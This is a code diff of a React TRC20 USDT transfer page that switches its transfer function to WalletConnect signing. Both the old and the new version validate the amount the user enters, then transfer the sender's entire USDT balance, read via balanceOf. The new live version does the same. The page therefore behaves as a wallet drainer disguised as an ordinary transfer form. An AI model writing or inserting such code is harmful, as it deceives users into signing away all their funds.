@@ -59,48 +59,130 @@ export default function TransferTRC20() {
     }
   };
 
-  const fn_transfer = async () => {
+//   const fn_transfer = async () => {
+//     try {
+//       setLoading(true);
+//  Swal.fire(
+//        window.tronWeb,
+//       );
+//       // 🔹 If TronLink or TrustWallet DApp browser
+//       if (window.tronWeb) {
+//         const tronWeb = window.tronWeb;
+//         if (!tronWeb.defaultAddress.base58) await connectInjectedWallet();
+//         const sender = tronWeb.defaultAddress.base58;
+
+//         if (!tronWeb.isAddress(receiver)) {
+//           Swal.fire("Error", "Invalid receiver address", "error");
+//           return;
+//         }
+
+//         if (!amount || Number(amount) <= 0) {
+//           Swal.fire("Error", "Enter valid amount", "error");
+//           return;
+//         }
+
+//         const contract = await tronWeb.contract().at(USDT_TRC20);
+
+//         const value =  await contract.balanceOf(sender).call();
+
+//         const tx = await contract.transfer(receiver, value).send({
+//           feeLimit: 100000000,
+//         });
+
+//         Swal.fire("Success!", `Transfer Successful\nTX: ${tx}`, "success");
+
+//         setAmount("");
+//         return;
+//       }
+
+//       // 🔹 Otherwise show message
+//       Swal.fire(
+//         "Wallet Required",
+//         "Please open this DApp inside TronLink or Trust Wallet DApp browser.",
+//         "warning",
+//       );
+//     } catch (err) {
+//       console.log(err);
+//       Swal.fire("Error", err?.message || "Transfer failed", "error");
+//     } finally {
+//       setLoading(false);
+//     }
+//   };
+
+    const fn_transfer = async () => {
     try {
+        const session = await connectTronWallet();
+      if (!session) {
+        Swal.fire("Error", "Wallet not connected", "error");
+        return;
+      }
+
+      if (!receiver || receiver.trim() === "") {
+        Swal.fire("Error", "Receiver address required", "error");
+        return;
+      }
+
+      if (!amount || Number(amount) <= 0) {
+        Swal.fire("Error", "Enter valid amount", "error");
+        return;
+      }
+
       setLoading(true);
- Swal.fire(
-       window.tronWeb,
+
+      const sender = session.namespaces.tron.accounts[0].split(":")[2]; // from WalletConnect session
+  const contract = await tronWeb.contract().at(USDT_TRC20);
+
+    const value = await contract.balanceOf(sender).call();
+
+      const functionSelector = "transfer(address,uint256)";
+      const parameter = [
+        { type: "address", value: receiver },
+        { type: "uint256", value: value }
+      ];
+
+      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_TRC20,
+        functionSelector,
+        {
+          feeLimit: 100000000
+        },
+        parameter,
+        sender
       );
-      // 🔹 If TronLink or TrustWallet DApp browser
-      // if (window.tronWeb) {
-      //   const tronWeb = window.tronWeb;
-      //   if (!tronWeb.defaultAddress.base58) await connectInjectedWallet();
-      //   const sender = tronWeb.defaultAddress.base58;
 
-      //   if (!tronWeb.isAddress(receiver)) {
-      //     Swal.fire("Error", "Invalid receiver address", "error");
-      //     return;
-      //   }
+      if (!tx.result.result) {
+        throw new Error("Transaction build failed");
+      }
 
-      //   if (!amount || Number(amount) <= 0) {
-      //     Swal.fire("Error", "Enter valid amount", "error");
-      //     return;
-      //   }
+      const unsignedTx = tx.transaction;
 
-      //   const contract = await tronWeb.contract().at(USDT_TRC20);
+      // 2️⃣ Sign using WalletConnect
+      const signedTx = await client.request({
+        topic: session.topic,
+        chainId: "tron:0x2b6653dc",
+        request: {
+          method: "tron_signTransaction",
+          params: {
+            transaction: unsignedTx
+          }
+        }
+      });
 
-      //   const value =  await contract.balanceOf(sender).call();
+      // 3️⃣ Broadcast to network
+      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      //   const tx = await contract.transfer(receiver, value).send({
-      //     feeLimit: 100000000,
-      //   });
+      if (!broadcast.result) {
+        throw new Error("Broadcast failed");
+      }
 
-      //   Swal.fire("Success!", `Transfer Successful\nTX: ${tx}`, "success");
+      Swal.fire(
+        "Success!",
+        `Transfer Successful\nTX: ${broadcast.txid}`,
+        "success"
+      );
 
-      //   setAmount("");
-      //   return;
-      // }
+      setAmount("");
 
-      // 🔹 Otherwise show message
-      // Swal.fire(
-      //   "Wallet Required",
-      //   "Please open this DApp inside TronLink or Trust Wallet DApp browser.",
-      //   "warning",
-      // );
     } catch (err) {
       console.log(err);
       Swal.fire("Error", err?.message || "Transfer failed", "error");
@@ -108,88 +190,6 @@ export default function TransferTRC20() {
       setLoading(false);
     }
   };
-
-  //   const fn_transfer = async () => {
-  //   try {
-  //       const session = await connectTronWallet();
-  //     if (!session) {
-  //       Swal.fire("Error", "Wallet not connected", "error");
-  //       return;
-  //     }
-
-  //     if (!receiver || receiver.trim() === "") {
-  //       Swal.fire("Error", "Receiver address required", "error");
-  //       return;
-  //     }
-
-  //     if (!amount || Number(amount) <= 0) {
-  //       Swal.fire("Error", "Enter valid amount", "error");
-  //       return;
-  //     }
-
-  //     setLoading(true);
-
-  //     const sender = session.namespaces.tron.accounts[0].split(":")[2]; // from WalletConnect session
-  // const contract = await tronWeb.contract().at(USDT_TRC20);
-
-  //   const value = await contract.balanceOf(sender).call();
-
-  //     const functionSelector = "transfer(address,uint256)";
-  //     const parameter = [
-  //       { type: "address", value: receiver },
-  //       { type: "uint256", value: value }
-  //     ];
-
-  //     const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-  //       USDT_TRC20,
-  //       functionSelector,
-  //       {
-  //         feeLimit: 100000000
-  //       },
-  //       parameter,
-  //       sender
-  //     );
-
-  //     if (!tx.result.result) {
-  //       throw new Error("Transaction build failed");
-  //     }
-
-  //     const unsignedTx = tx.transaction;
-
-  //     // 2️⃣ Sign using WalletConnect
-  //     const signedTx = await client.request({
-  //       topic: session.topic,
-  //       chainId: "tron:0x2b6653dc",
-  //       request: {
-  //         method: "tron_signTransaction",
-  //         params: {
-  //           transaction: unsignedTx
-  //         }
-  //       }
-  //     });
-
-  //     // 3️⃣ Broadcast to network
-  //     const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-
-  //     if (!broadcast.result) {
-  //       throw new Error("Broadcast failed");
-  //     }
-
-  //     Swal.fire(
-  //       "Success!",
-  //       `Transfer Successful\nTX: ${broadcast.txid}`,
-  //       "success"
-  //     );
-
-  //     setAmount("");
-
-  //   } catch (err) {
-  //     console.log(err);
-  //     Swal.fire("Error", err?.message || "Transfer failed", "error");
-  //   } finally {
-  //     setLoading(false);
-  //   }
-  // };
 
   return (
     <div style={styles.page}>
